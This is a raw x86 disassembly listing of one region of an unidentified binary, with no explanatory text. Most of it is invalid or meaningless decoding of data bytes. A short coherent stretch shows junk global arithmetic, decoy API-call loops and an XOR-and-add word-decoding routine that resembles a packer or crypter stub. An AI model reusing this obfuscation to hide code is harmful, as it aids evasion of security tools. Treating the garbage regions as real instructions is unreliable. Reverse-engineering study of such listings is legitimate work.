  410189:	pop    es
  41018a:	mov    esp,DWORD PTR [ebx-0x577d4b1c]
  410190:	sbb    DWORD PTR [ebx+edi*2-0x29232a64],edi
  410197:	popa   
  410198:	(bad)  
  410199:	push   esp
  41019a:	lea    edi,[ecx]
  41019c:	daa    
  41019d:	test   dl,dh
  41019f:	outs   dx,DWORD PTR ds:[esi]
  4101a0:	jo     0x4101e4
  4101a2:	in     al,0x9b
  4101a4:	xor    DWORD PTR [ebp+0xf1481b4],esi
  4101aa:	or     al,0x70
  4101ac:	dec    edx
  4101ad:	sbb    al,0xd3
  4101af:	sub    edx,DWORD PTR [esi]
  4101b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101b2:	cwde   
  4101b3:	arpl   WORD PTR [esi],cx
  4101b5:	mov    ecx,0xf5ae3f14
  4101ba:	dec    ecx
  4101bb:	gs ja  0x410195
  4101be:	fld    TBYTE PTR [eax+0x7f93f4a8]
  4101c4:	ss push eax
  4101c6:	pop    edx
  4101c7:	fcmovbe st,st(0)
  4101c9:	xchg   ebp,eax
  4101ca:	shl    DWORD PTR [esp+edx*8+0x6bcd2ce0],0x38
  4101d2:	mov    bl,0x81
  4101d4:	stc    
  4101d5:	fisub  DWORD PTR [edx]
  4101d7:	pop    eax
  4101d8:	sbb    al,0xeb
  4101da:	mov    edx,0xc0ae5560
  4101df:	mov    cl,BYTE PTR [eax+0x48]
  4101e2:	inc    DWORD PTR [esi]
  4101e4:	daa    
  4101e5:	inc    edx
  4101e6:	std    
  4101e7:	test   al,0xaa
  4101e9:	sbb    al,0x31
  4101eb:	loop   0x4101f9
  4101ed:	ret    
  4101ee:	mov    ds:0x115acc86,al
  4101f3:	inc    esp
  4101f4:	dec    ecx
  4101f5:	inc    ebp
  4101f6:	jns    0x410205
  4101f8:	mov    cl,0x41
  4101fa:	test   BYTE PTR [ebx],cl
  4101fc:	mov    esi,0xf1f799e4
  410201:	mov    ecx,DWORD PTR [ebp+0x10]
  410204:	and    ecx,eax
  410206:	or     ecx,0x81161d8f
  41020c:	mov    eax,ecx
  41020e:	pop    ebp
  41020f:	ret    0x18
  410212:	push   ebp
  410213:	mov    ebp,esp
  410215:	sub    esp,0x58
  410218:	mov    ecx,DWORD PTR ds:0x43369f
  41021e:	adc    DWORD PTR ds:0x4336d7,ecx
  410224:	mov    ecx,DWORD PTR [ebp+0x8]
  410227:	and    eax,0x4408
  41022c:	mov    eax,0x8a3c
  410231:	xor    ax,WORD PTR [ecx+0x20]
  410235:	sub    ecx,0x2534
  41023b:	mov    ecx,0x3b02
  410240:	or     DWORD PTR ds:0x43360b,0x3241
  41024a:	add    ax,cx
  41024d:	xor    DWORD PTR ds:0x43372b,0x1afb
  410257:	movzx  eax,ax
  41025a:	and    ecx,0x4b4d
  410260:	mov    DWORD PTR [ebp-0xc],eax
  410263:	xor    ecx,ecx
  410265:	xor    ecx,DWORD PTR ds:0x4336df
  41026b:	or     DWORD PTR ds:0x4336d7,ecx
  410271:	mov    BYTE PTR [ebp-0x1],0x7f
  410275:	and    DWORD PTR ds:0x4336ab,0x0
  41027f:	jmp    0x410291
  410284:	mov    ecx,DWORD PTR ds:0x4336ab
  41028a:	inc    ecx
  41028b:	mov    DWORD PTR ds:0x4336ab,ecx
  410291:	cmp    DWORD PTR ds:0x4336ab,0x14
  410298:	jae    0x4102ed
  41029e:	cmp    DWORD PTR ds:0x4336ab,0xb
  4102a5:	jne    0x4102c6
  4102ab:	push   DWORD PTR [ebp-0x28]
  4102ae:	push   0x4636
  4102b3:	push   0x8d9e
  4102b8:	push   0x8baf
  4102bd:	push   DWORD PTR [ebp-0x18]
  4102c0:	call   DWORD PTR ds:0x412374
  4102c6:	cmp    DWORD PTR ds:0x4336ab,0xa
  4102cd:	jne    0x4102e2
  4102d3:	xor    ecx,ecx
  4102d5:	add    ecx,DWORD PTR ds:0x4336ab
  4102db:	inc    ecx
  4102dc:	mov    DWORD PTR ds:0x4336ab,ecx
  4102e2:	jmp    0x410284
  4102e7:	sbb    ecx,DWORD PTR ds:0x433603
  4102ed:	lea    eax,[ebp-0x1]
  4102f0:	mov    DWORD PTR [ebp-0x10],eax
  4102f3:	mov    al,BYTE PTR [ebp-0x1]
  4102f6:	mov    ecx,DWORD PTR [ebp-0x10]
  4102f9:	sub    DWORD PTR ds:0x4336e7,0x43369f
  410303:	xor    al,0x46
  410305:	xor    DWORD PTR ds:0x4336e3,0x433697
  41030f:	sub    al,0x38
  410311:	mov    BYTE PTR [ecx],al
  410313:	movzx  ecx,WORD PTR ds:0x433657
  41031a:	sub    DWORD PTR ds:0x43361f,ecx
  410320:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  410327:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  41032e:	and    DWORD PTR ds:0x43365b,0x0
  410338:	mov    ecx,DWORD PTR ds:0x43365b
  41033e:	inc    ecx
  41033f:	mov    DWORD PTR ds:0x43365b,ecx
  410345:	cmp    DWORD PTR ds:0x43365b,0x25
  41034c:	jne    0x410362
  410352:	push   0x4337af
  410357:	push   0x4337ef
  41035c:	call   DWORD PTR ds:0x4120f4
  410362:	cmp    DWORD PTR ds:0x43365b,0x16
  410369:	jb     0x410338
  41036f:	adc    DWORD PTR ds:0x43369f,edx
  410375:	mov    eax,DWORD PTR [ebp-0x8]
  410378:	and    DWORD PTR ds:0x433713,0x0
  410382:	mov    ecx,DWORD PTR ds:0x433713
  410388:	inc    ecx
  410389:	mov    DWORD PTR ds:0x433713,ecx
  41038f:	cmp    DWORD PTR ds:0x433713,0xf
  410396:	jne    0x4103ac
  41039c:	push   0x4336e7
  4103a1:	push   0x178b
  4103a6:	call   DWORD PTR ds:0x412378
  4103ac:	cmp    DWORD PTR ds:0x433713,0xe
  4103b3:	jne    0x4103c8
  4103b9:	xor    ecx,ecx
  4103bb:	xor    ecx,DWORD PTR ds:0x433713
  4103c1:	inc    ecx
  4103c2:	mov    DWORD PTR ds:0x433713,ecx
  4103c8:	cmp    DWORD PTR ds:0x433713,0x1b
  4103cf:	jb     0x410382
  4103d5:	sub    DWORD PTR ds:0x43365f,edx
  4103db:	mov    ecx,0x7510854
  4103e0:	push   esi
  4103e1:	and    DWORD PTR ds:0x433657,0x0
  4103eb:	jmp    0x4103ff
  4103f0:	xor    esi,esi
  4103f2:	add    esi,DWORD PTR ds:0x433657
  4103f8:	inc    esi
  4103f9:	mov    DWORD PTR ds:0x433657,esi
  4103ff:	cmp    DWORD PTR ds:0x433657,0x1d
  410406:	jae    0x410427
  41040c:	cmp    DWORD PTR ds:0x433657,0x26
  410413:	jne    0x410422
  410419:	push   DWORD PTR [ebp-0x24]
  41041c:	call   DWORD PTR ds:0x4122b4
  410422:	jmp    0x4103f0
  410427:	xor    eax,ecx
  410429:	mov    esi,0x32729b
  41042e:	add    eax,esi
  410430:	jmp    0x41043d
  410435:	mov    dl,BYTE PTR [ebp-0x1]
  410438:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  41043c:	inc    eax
  41043d:	cmp    eax,0x40
  410440:	jb     0x410435
  410446:	mov    edx,DWORD PTR [ebp-0x8]
  410449:	mov    eax,DWORD PTR [ebp-0xc]
  41044c:	xor    edx,ecx
  41044e:	add    edx,esi
  410450:	cmp    edx,eax
  410452:	je     0x410766
  410458:	push   ebx
  410459:	push   edi
  41045a:	mov    edi,DWORD PTR [ebp+0x8]
  41045d:	mov    eax,0x8a3c
  410462:	xor    ax,WORD PTR [edi+edx*4+0x2]
  410467:	mov    edi,0x3b02
  41046c:	add    ax,di
  41046f:	movzx  eax,ax
  410472:	mov    DWORD PTR [ebp-0x14],eax
  410475:	mov    eax,DWORD PTR [ebp+0x8]
  410478:	movzx  eax,WORD PTR [eax+edx*4]
  41047c:	xor    eax,0x8a3c
  410481:	add    eax,edi
  410483:	mov    edi,DWORD PTR [ebp-0x14]
  410486:	mov    BYTE PTR [ebp+edi*1-0x58],al
  41048a:	jmp    0x410758
  41048f:	cdq    
  410490:	outs   dx,BYTE PTR ds:[esi]
  410491:	mov    ds:0xa1f17118,eax
  410496:	outs   dx,DWORD PTR ds:[esi]
  410497:	or     BYTE PTR [edx],bl
  410499:	push   es
  41049a:	out    0x12,al
  41049c:	mov    BYTE PTR [esi+0x6f],ch
  41049f:	fdiv   QWORD PTR [eax+0x7caf7e7e]
  4104a5:	jle    0x410525
  4104a7:	pop    ebp
  4104a8:	push   esp
  4104a9:	repz inc esi
  4104ab:	xor    ebp,DWORD PTR [ebp-0x5035e07f]
  4104b1:	jmp    0x38e8:0x1efa7292
  4104b8:	and    ah,al
  4104ba:	add    DWORD PTR ds:0xaf01bd2a,esi
  4104c0:	ins    DWORD PTR es:[edi],dx
  4104c1:	or     ebp,DWORD PTR [esi-0x15]
  4104c4:	sub    BYTE PTR [edx-0x1598f991],0xdc
  4104cb:	sbb    edi,edx
  4104cd:	ins    DWORD PTR es:[edi],dx
  4104ce:	jge    0x410529
  4104d0:	dec    ebx
  4104d1:	xor    DWORD PTR [ebx-0x78],ebp
  4104d4:	jnp    0x410471
  4104d6:	dec    esi
  4104d7:	pushf  
  4104d8:	repz xor DWORD PTR [eax],edi
  4104db:	pushf  
  4104dc:	js     0x410557
  4104de:	jmp    0x56592406
  4104e3:	jno    0x4104b9
  4104e5:	pushf  
  4104e6:	jecxz  0x410560
  4104e8:	xchg   ecx,eax
  4104e9:	or     BYTE PTR [ecx+0x7b18fc97],bl
  4104ef:	cmp    edi,ebx
  4104f1:	mov    eax,eax
  4104f3:	xchg   ebp,eax
  4104f4:	inc    ebp
  4104f5:	push   esp
  4104f6:	add    BYTE PTR [edi-0x628c58d0],0xbb
  4104fd:	sar    BYTE PTR [bp+di],0x70
  410501:	sbb    BYTE PTR [ebp-0x72b78ad9],al
  410507:	add    al,0xc5
  410509:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41050a:	jns    0x41057c
  41050c:	fwait
  41050d:	jne    0x410582
  41050f:	dec    ebp
  410510:	jecxz  0x41053d
  410512:	push   ebp
  410513:	bound  edx,QWORD PTR [ebp+eax*1-0x4c]
  410517:	cs icebp 
  410519:	sbb    DWORD PTR [edi+eax*1-0x20],edx
  41051d:	lahf   
  41051e:	fbld   TBYTE PTR [edi]
  410520:	inc    ebp
  410521:	pop    esi
  410522:	shr    ecx,cl
  410524:	xlat   BYTE PTR ds:[ebx]
  410525:	xchg   edx,eax
  410526:	jecxz  0x41056c
  410528:	mov    fs,WORD PTR [ebp+0x2a]
  41052b:	xor    eax,0xe5ba3162
  410530:	jg     0x410564
  410532:	add    al,BYTE PTR [ebx+0x2a]
  410535:	bound  esp,QWORD PTR [eax+0x1d]
  410538:	test   cl,dl
  41053a:	sub    BYTE PTR [ebx+ecx*4+0x8],0x5b
  41053f:	xchg   ebx,eax
  410540:	jge    0x4105a0
  410542:	popa   
  410543:	pop    ds
  410544:	sbb    DWORD PTR [edx-0x7d9960f5],0x7661cd86
  41054e:	cmp    BYTE PTR [edx+0x7b],cl
  410551:	call   0x225965e1
  410556:	(bad)  
  410557:	cmp    al,0xce
  410559:	out    dx,al
  41055a:	adc    DWORD PTR [edx-0x32],edi
  41055d:	jmp    0x410589
  41055f:	(bad)  
  410560:	pusha  
  410561:	and    eax,0x4be3510
  410566:	or     eax,0xac3b8689
  41056b:	jge    0x410567
  41056d:	xchg   ebp,eax
  41056e:	sbb    eax,0x4db757dd
  410573:	push   edi
  410574:	inc    esi
  410575:	sbb    ecx,edi
  410577:	scas   eax,DWORD PTR es:[edi]
  410578:	mov    ds,WORD PTR fs:[ebx+0xaf6dcfc]
  41057f:	mov    bl,0xc3
  410581:	in     al,dx
  410582:	(bad)  
  410583:	into   
  410584:	sub    al,0x6c
  410586:	cmp    BYTE PTR [esi+ebx*2],dl
  410589:	sar    DWORD PTR [ebx-0xa],0xc6
  41058d:	and    ch,BYTE PTR [esi]
  41058f:	mov    dl,0xbd
  410591:	shl    bl,0x8
  410594:	mov    dh,0xb
  410596:	addr16 jne 0x4105e9
  410599:	jno    0x4105ad
  41059b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41059c:	stos   BYTE PTR es:[edi],al
  41059d:	dec    edx
  41059e:	jno    0x41052f
  4105a0:	add    ah,al
  4105a2:	test   DWORD PTR [ebp-0x4b62dc9a],edi
  4105a8:	mov    bh,0x57
  4105aa:	mov    ch,0xc6
  4105ac:	imul   ebp,DWORD PTR [ebx],0x2636c9a0
  4105b2:	stos   BYTE PTR es:[edi],al
  4105b3:	xchg   ebp,eax
  4105b4:	loop   0x410582
  4105b6:	lds    eax,FWORD PTR [ebx+eax*1+0x79]
  4105ba:	or     eax,0xe06ce2d6
  4105bf:	xor    ah,BYTE PTR [ebp+0x75314d0a]
  4105c5:	dec    edi
  4105c6:	mov    cl,0xaf
  4105c8:	ret    
  4105c9:	sbb    esi,ebp
  4105cb:	push   ebx
  4105cc:	ins    BYTE PTR es:[edi],dx
  4105cd:	mov    dl,0xa2
  4105cf:	(bad)  
  4105d1:	dec    ebx
  4105d2:	mov    dh,0x59
  4105d4:	daa    
  4105d5:	in     eax,0x40
  4105d7:	or     al,0x6d
  4105d9:	mov    ebx,DWORD PTR [edi]
  4105db:	jle    0x410632
  4105dd:	out    dx,al
  4105de:	sbb    al,0x20
  4105e0:	xchg   edi,eax
  4105e1:	sbb    bl,BYTE PTR [esi-0x27669ea]
  4105e7:	nop
  4105e8:	mov    ah,0xd
  4105ea:	cli    
  4105eb:	ss pop ds
  4105ed:	mov    esp,DWORD PTR [eax]
  4105ef:	pop    es
  4105f0:	pop    esi
  4105f1:	or     dh,ah
  4105f3:	jns    0x410603
  4105f5:	rol    edi,1
  4105f7:	inc    esp
  4105f8:	bound  esp,QWORD PTR [ebp-0x4517bd8f]
  4105fe:	push   0x6957cd5
  410603:	mov    ch,0xb5
  410605:	ror    BYTE PTR [ecx-0x61],0x7d
  410609:	and    al,0x2
  41060b:	shr    eax,cl
  41060d:	mov    edi,0x648c4a5e
  410612:	mov    ah,0x74
  410614:	jnp    0x4105c5
  410616:	jae    0x4105ca
  410618:	mov    ds:0xb6c9ae21,al
  41061d:	push   0xc2715cc4
  410622:	xchg   esp,eax
  410623:	dec    edx
  410624:	push   0xfb19c49e
  410629:	fwait
  41062a:	ret    0x1007
  41062d:	gs (bad) 
  41062f:	(bad)  
  410630:	push   0x1fa8de66
  410635:	xchg   edi,eax
  410636:	test   BYTE PTR [edi],al
  410638:	add    ecx,DWORD PTR [esi]
  41063a:	jmp    0xd35d:0xc08e33fc
  410641:	sub    ecx,0x59
  410644:	cmp    BYTE PTR [edx+0x131d69cd],bh
  41064a:	dec    ebx
  41064b:	xor    al,0xf8
  41064d:	mov    dh,0x3e
  41064f:	push   ebp
  410650:	aaa    
  410651:	lods   al,BYTE PTR ds:[esi]
  410652:	ins    DWORD PTR es:[edi],dx
  410653:	cmp    bh,BYTE PTR [esi]
  410655:	or     al,0x98
  410657:	pop    edi
  410658:	icebp  
  410659:	fld    TBYTE PTR [esi-0x1a]
  41065c:	sub    BYTE PTR [ecx+0x61],bl
  41065f:	push   0x29
  410661:	out    dx,eax
  410662:	lahf   
  410663:	je     0x410615
  410665:	push   0xe0e3a1ad
  41066a:	dec    ecx
  41066b:	out    0xa7,al
  41066d:	push   ds
  41066e:	xchg   ebx,eax
  41066f:	scas   al,BYTE PTR es:[edi]
  410670:	int3   
  410671:	mov    ?,ecx
  410673:	jecxz  0x410629
  410675:	cmp    bl,BYTE PTR ds:0x242ce4d1
  41067b:	out    dx,eax
  41067c:	(bad)  
  41067d:	call   0xab18:0x53d08bd6
  410684:	hlt    
  410685:	jbe    0x41060c
  410687:	inc    eax
  410688:	dec    eax
  410689:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41068a:	jge    0x410695
  41068c:	push   ecx
  41068d:	xchg   edx,eax
  41068e:	cmc    
  41068f:	mov    eax,DWORD PTR [edi-0x20]
  410692:	dec    esp
  410693:	adc    al,BYTE PTR cs:[eax-0x28fdb25f]
  41069a:	push   ecx
  41069b:	sub    dh,BYTE PTR [esi+0x4af5c3e]
  4106a1:	xor    dl,BYTE PTR [edi]
  4106a3:	jmp    0x4106f9
  4106a5:	pop    es
  4106a6:	inc    ebp
  4106a7:	fcomp  QWORD PTR [edx-0x9]
  4106aa:	add    eax,0x983def7e
  4106af:	mov    DWORD PTR [edx],esi
  4106b1:	push   esp
  4106b2:	loopne 0x4106fa
  4106b4:	ins    BYTE PTR es:[edi],dx
  4106b5:	jecxz  0x4106b8
  4106b7:	pushf  
  4106b8:	je     0x410738
  4106ba:	imul   ecx,esi,0x25
  4106bd:	xchg   ecx,eax
  4106be:	rsqrtps xmm6,XMMWORD PTR [ebx]
  4106c1:	mov    esi,0x5f2e9529
  4106c6:	or     al,0xdd
  4106c8:	mov    eax,0xc06d4305
  4106cd:	add    BYTE PTR [ebx-0x50],cl
  4106d0:	cmp    DWORD PTR [ebx-0x699cb1a7],ebp
  4106d6:	je     0x4106b4
  4106d8:	cmp    eax,0xe38b7c7c
  4106dd:	mov    ss,edx
  4106df:	xchg   esp,eax
  4106e0:	xor    cl,bl
  4106e2:	push   ecx
  4106e3:	(bad)  
  4106e4:	popa   
  4106e5:	sbb    BYTE PTR [esi+0x361548c3],bl
  4106eb:	leave  
  4106ec:	outs   dx,DWORD PTR ds:[esi]
  4106ed:	jno    0x4106ca
  4106ef:	scas   eax,DWORD PTR es:[edi]
  4106f0:	lods   eax,DWORD PTR ds:[esi]
  4106f1:	scas   al,BYTE PTR es:[edi]
  4106f2:	sub    BYTE PTR [edx-0x1e],0x11
  4106f6:	clc    
  4106f7:	mov    esi,0x2a1eb168
  4106fc:	outs   dx,BYTE PTR ds:[esi]
  4106fd:	std    
  4106fe:	xchg   edx,eax
  4106ff:	call   0xf7c7:0x485303fa
  410706:	ins    BYTE PTR es:[edi],dx
  410707:	jne    0x4106b3
  410709:	and    BYTE PTR [ebx-0x6a876ec0],ah
  41070f:	pop    DWORD PTR [ecx]
  410711:	push   ds
  410712:	and    DWORD PTR [eax-0x21],0x3074dd87
  410719:	cs into 
  41071b:	jo     0x410762
  41071d:	dec    edi
  41071e:	dec    esp
  41071f:	jno    0x410701
  410721:	out    dx,eax
  410722:	pushf  
  410723:	(bad)  
  410724:	in     al,0x54
  410726:	cmc    
  410727:	inc    eax
  410728:	clc    
  410729:	sbb    DWORD PTR [edi],ebp
  41072b:	cmovs  ebx,DWORD PTR [edi+0x49]
  41072f:	push   ebp
  410730:	int3   
  410731:	icebp  
  410732:	push   fs
  410734:	xor    eax,ebx
  410736:	xchg   esi,eax
  410737:	test   eax,0x8a9ddd22
  41073c:	jmp    0x8588ddad
  410741:	sub    esp,DWORD PTR [ebp-0x26]
  410744:	sbb    cl,al
  410746:	jb     0x410773
  410748:	out    0x8d,al
  41074a:	add    cl,BYTE PTR [eax]
  41074c:	fsub   QWORD PTR [edx+0x54]
  41074f:	leave  
  410750:	xor    BYTE PTR [ebx+0x51d3c381],0x68
  410757:	sub    al,0x8b
  410759:	inc    ebp
  41075a:	hlt    
  41075b:	inc    edx
  41075c:	cmp    edx,eax
  41075e:	jne    0x41045a
  410764:	pop    edi
  410765:	pop    ebx
  410766:	mov    eax,DWORD PTR [ebp-0x8]
  410769:	mov    edx,DWORD PTR [ebp+0x10]
  41076c:	xor    eax,ecx
  41076e:	jmp    0x410a3c
  410773:	mov    ds:0x6929ab51,eax
  410778:	icebp  
  410779:	mov    eax,ds:0x2251d751
  41077e:	and    eax,0xdb89c61b
  410783:	or     eax,0xaf7e7ebf
  410788:	jl     0x410808
  41078a:	jle    0x41075a
  41078c:	loope  0x4107aa
  41078e:	addr16 mov al,0x61
  410791:	inc    esi
  410792:	jmp    0x410777
  410794:	jnp    0x41076b
  410796:	lock pop ecx
  410798:	mul    BYTE PTR [eax-0x65]
  41079b:	test   al,0x17
  41079d:	imul   ecx,DWORD PTR [esi-0x2b],0x47cf2a7f
  4107a4:	test   ecx,0xb4f80ca0
  4107aa:	push   edi
  4107ab:	nop
  4107ac:	scas   al,BYTE PTR es:[edi]
  4107ad:	push   edi
  4107ae:	mov    al,ds:0x5c9bac84
  4107b4:	xchg   edi,eax
  4107b5:	jno    0x410737
  4107b7:	push   edi
  4107b8:	mov    bh,0x67
  4107ba:	(bad)  [ebx]
  4107bc:	lea    ebx,[esi+0x1c]
  4107bf:	and    BYTE PTR [edx],al
  4107c1:	ss xor al,0xc8
  4107c4:	push   ds
  4107c5:	ds push esi
  4107c7:	ins    BYTE PTR es:[edi],dx
  4107c8:	jp     0x410762
  4107ca:	div    BYTE PTR [edx-0x79370d6b]
  4107d0:	jge    0x410778
  4107d2:	adc    BYTE PTR [edx+0x35c398e3],ch
  4107d8:	mov    cl,0xf3
  4107da:	mov    WORD PTR [ecx+eax*2-0x2903393],?
  4107e1:	(bad)  
  4107e2:	mov    dh,0xe4
  4107e4:	adc    BYTE PTR [ecx+0x55],0x33
  4107e8:	dec    ebp
  4107e9:	in     al,dx
  4107ea:	mov    al,ds:0xdf61e18b
  4107ef:	fbld   TBYTE PTR [ebp+0x44]
  4107f2:	or     eax,0x151468b7
  4107f7:	and    edx,DWORD PTR ds:[eax+0x7]
  4107fb:	dec    edx
  4107fc:	call   0xa1a0:0xc90e068d
  410803:	arpl   WORD PTR fs:[ecx-0x49],sp
  410807:	adc    DWORD PTR [eax],ebp
  410809:	call   0x3e0e71e0
  41080e:	neg    DWORD PTR [ebp+ebx*2-0x7b]
  410812:	jge    0x4107e5
  410814:	xchg   edi,eax
  410815:	ins    DWORD PTR es:[edi],dx
  410816:	push   ecx
  410817:	retf   0xbb36
  41081a:	ret    0xaab7
  41081d:	fild   QWORD PTR [edx-0x275ae829]
  410823:	jmp    0xfb6b:0x6aea6469
  41082a:	push   edx
  41082b:	mov    ebp,0x41baa325
  410830:	or     DWORD PTR [edi],ecx
  410832:	jle    0x41088a
  410834:	pop    ss
  410835:	mov    bl,0xa
  410837:	push   0x2eb0b2fd
  41083c:	cmp    bh,0xcb
  41083f:	xchg   DWORD PTR [edi+0x5],ebx
  410842:	push   eax
  410843:	mov    dl,0x1e
  410845:	sbb    dh,ch
  410847:	lods   eax,DWORD PTR ds:[esi]
  410848:	popf   
  410849:	pop    edi
  41084a:	ins    DWORD PTR es:[edi],dx
  41084b:	sub    ebp,DWORD PTR [esi-0x54cbdadc]
  410851:	sahf   
  410852:	outs   dx,DWORD PTR ds:[esi]
  410853:	adc    BYTE PTR [edx+0x1c],ch
  410856:	mov    ?,ebp
  410858:	cs loopne 0x4108ca
  41085b:	in     al,dx
  41085c:	ror    BYTE PTR [ecx],0x84
  41085f:	fcomp  DWORD PTR [edx-0x7a]
  410862:	adc    eax,0xab4b7a70
  410867:	push   ecx
  410868:	hlt    
  410869:	pop    edx
  41086a:	fistp  DWORD PTR [edi-0x363cac06]
  410870:	fimul  DWORD PTR [edx+0x37]
  410873:	shr    BYTE PTR [ecx*4-0x548ff9bc],1
  41087a:	hlt    
  41087b:	pop    es
  41087c:	jecxz  0x41089c
  41087e:	out    0xb5,eax
  410880:	lock fld DWORD PTR ds:0x51dee96f
  410887:	cmp    al,0x93
  410889:	push   edx
  41088a:	fisubr DWORD PTR [ecx+0x33]
  41088d:	shr    BYTE PTR [esi+0x2b90352b],cl
  410893:	int3   
  410894:	xchg   esp,eax
  410895:	mov    al,0x7
  410897:	mov    al,ds:0x2da73746
  41089c:	nop
  41089d:	and    DWORD PTR [ebx-0x2455f5a2],eax
  4108a3:	(bad)  
  4108a4:	jne    0x4108ca
  4108a6:	enter  0xfba0,0xda
  4108aa:	add    BYTE PTR [ebp-0x76],ch
  4108ad:	ja     0x4108b7
  4108af:	std    
  4108b0:	stc    
  4108b1:	icebp  
  4108b2:	push   ecx
  4108b3:	push   0xffffffb6
  4108b5:	sub    al,0x65
  4108b7:	shl    BYTE PTR [ecx],cl
  4108b9:	pop    ebx
  4108ba:	neg    DWORD PTR [edi+0x61]
  4108bd:	xor    bl,BYTE PTR [ecx+0x2f26a6f4]
  4108c3:	aaa    
  4108c4:	add    eax,0xc19242bd
  4108c9:	jb     0x41090b
  4108cb:	sbb    BYTE PTR [edi+0x24fddaec],dl
  4108d1:	daa    
  4108d2:	popa   
  4108d3:	adc    esp,DWORD PTR [ecx]
  4108d5:	jmp    0x410950
  4108d7:	retf   
  4108d8:	sub    BYTE PTR [ebx+ebp*8],0x86
  4108dc:	rcr    BYTE PTR [edx+ebx*8],0x37
  4108e0:	push   eax
  4108e1:	sub    eax,0x81acbb6c
  4108e6:	jmp    0x410944
  4108e8:	sub    DWORD PTR [esi],esi
  4108ea:	repnz push DWORD PTR [ecx-0x63]
  4108ee:	das    
  4108ef:	dec    ecx
  4108f0:	push   eax
  4108f1:	sbb    ebp,0x1a08919b
  4108f7:	jb     0x4108fb
  4108f9:	repz pop ebx
  4108fb:	arpl   di,bx
  4108fd:	out    dx,eax
  4108fe:	sbb    al,0xf3
  410900:	call   0x32716438
  410905:	into   
  410906:	or     bh,bh
  410908:	sar    ch,0xdc
  41090b:	repnz jecxz 0x410931
  41090e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41090f:	aaa    
  410910:	push   ebp
  410911:	lods   eax,DWORD PTR ds:[esi]
  410912:	pop    ecx
  410913:	jg     0x4108a8
  410915:	fbstp  TBYTE PTR [ecx]
  410917:	in     al,0x6
  410919:	loopne 0x41095a
  41091b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41091c:	fmul   QWORD PTR [eax-0x5d]
  41091f:	(bad)  
  410920:	jno    0x4108c0
  410922:	cld    
  410923:	pop    esi
  410924:	rol    ebx,cl
  410926:	in     al,dx
  410927:	push   edi
  410928:	sbb    DWORD PTR [eax+0x568149ec],eax
  41092e:	jge    0x41095f
  410930:	push   eax
  410931:	mov    cl,ah
  410933:	arpl   dx,di
  410935:	out    dx,eax
  410936:	hlt    
  410937:	fs sub ah,0x52
  41093b:	adc    BYTE PTR [eax],dl
  41093d:	out    dx,eax
  41093e:	pop    eax
  41093f:	jl     0x410936
  410941:	mov    edi,0x1c16bfe2
  410946:	icebp  
  410947:	jecxz  0x410969
  410949:	jo     0x4108f4
  41094b:	push   ebp
  41094c:	loope  0x4108f3
  41094e:	xor    DWORD PTR [eax+0x5e5a9932],eax
  410954:	sbb    BYTE PTR [edi],cl
  410956:	out    0xcc,al
  410958:	pushf  
  410959:	aaa    
  41095a:	test   al,0x9d
  41095c:	out    dx,al
  41095d:	test   DWORD PTR [ebp+0x49],edx
  410960:	jg     0x410929
  410962:	call   FWORD PTR [edi]
  410964:	add    al,0xae
  410966:	xor    eax,0xa57a6d77
  41096b:	aad    0x94
  41096d:	std    
  41096e:	fstp   DWORD PTR [ecx]
  410970:	popf   
  410971:	cmp    eax,0xa5ac53a9
  410976:	outs   dx,BYTE PTR ds:[esi]
  410977:	call   0xe6394b09
  41097c:	mov    esi,DWORD PTR [ebp+edi*2-0x4f]
  410980:	xchg   ah,cl
  410982:	pop    esp
  410983:	das    
  410984:	inc    esp
  410985:	fs sti 
  410987:	pop    ebp
  410988:	retf   0x779c
  41098b:	add    dh,BYTE PTR [ecx-0x7bdbfc23]
  410991:	not    BYTE PTR [eax]
  410993:	outs   dx,BYTE PTR ds:[esi]
  410994:	cld    
  410995:	ror    al,cl
  410997:	xchg   ebx,eax
  410998:	out    dx,eax
  410999:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41099a:	or     ch,bl
  41099c:	rcr    DWORD PTR [eax+edi*8-0x7f10d51c],1
  4109a3:	inc    esp
  4109a4:	cmp    eax,0x9762e13d
  4109a9:	lock sub DWORD PTR [eax-0x61a864b6],0x45
  4109b1:	loopne 0x4109ce
  4109b3:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4109b5:	pop    ebp
  4109b6:	test   DWORD PTR [esi],eax
  4109b8:	or     BYTE PTR ds:0x3e5ace42,0xc7
  4109bf:	shl    BYTE PTR [eax],0x8
  4109c2:	xchg   esi,eax
  4109c3:	mov    eax,ds:0x7853848
  4109c8:	sub    BYTE PTR [ebp-0x61220e6d],0x6c
  4109cf:	xchg   edi,eax
  4109d0:	sub    DWORD PTR [ebx-0x24],ebx
  4109d3:	inc    ecx
  4109d4:	sbb    edx,edx
  4109d6:	jecxz  0x410a0a
  4109d8:	pop    ss
  4109d9:	mov    al,0x87
  4109db:	popa   
  4109dc:	jge    0x41099c
  4109de:	and    bl,BYTE PTR [ebx+0x68d1d5a5]
  4109e4:	add    eax,0x7173b518
  4109e9:	mov    dh,0x3f
  4109eb:	outs   dx,DWORD PTR ds:[esi]
  4109ec:	or     al,0x54
  4109ee:	or     eax,0xd54a3662
  4109f3:	add    bl,dh
  4109f5:	xor    DWORD PTR [edi+0x307f5267],esi
  4109fb:	daa    
  4109fc:	jmp    0x4109bc
  4109fe:	je     0x410a5d
  410a00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a01:	jmp    0x410a4a
  410a03:	push   eax
  410a04:	xor    ebp,edx
  410a06:	pop    ss
  410a07:	mov    bl,0xd4
  410a09:	js     0x410a22
  410a0b:	xor    DWORD PTR [ebx-0x44405e16],ecx
  410a11:	out    0x1f,eax
  410a13:	mov    ch,0x1f
  410a15:	lea    esp,fs:[esp+edx*4-0x2fe43d1f]
  410a1d:	(bad)
  410a21:	outs   dx,DWORD PTR ds:[esi]
  410a22:	hlt    
  410a23:	fidiv  WORD PTR [edi-0x7bf5b96e]
  410a29:	mov    eax,0x372b62ce
  410a2e:	into   
  410a2f:	lods   eax,DWORD PTR ds:[esi]
  410a30:	(bad)  
  410a31:	call   0x79f9dc6e
  410a36:	and    bl,dl
